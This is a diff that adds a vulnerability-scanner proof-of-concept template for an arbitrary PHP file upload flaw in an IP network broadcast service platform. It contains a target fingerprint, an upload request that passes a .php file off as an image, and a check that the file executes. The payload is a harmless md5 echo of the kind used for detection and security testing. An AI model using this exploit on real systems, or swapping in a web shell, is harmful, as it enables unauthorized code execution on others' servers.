@@ -1,0 +1,33 @@
+id: poc-yaml-itc-upload-anyfile-upload
+info:
+  name: IP网络广播服务平台 upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: IP网络广播服务平台
+  fofa: icon_hash="-568806419"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/v2/remote-upgrade/upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1
+  data: '------WebKitFormBoundarytiZYyyKkbwCxtHC1
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundarytiZYyyKkbwCxtHC1--'
+  expression: status_code == 200 && contains(body,"relative_path")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{32}).php")
+- method: GET
+  path: /uploads/remote_upgrade/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
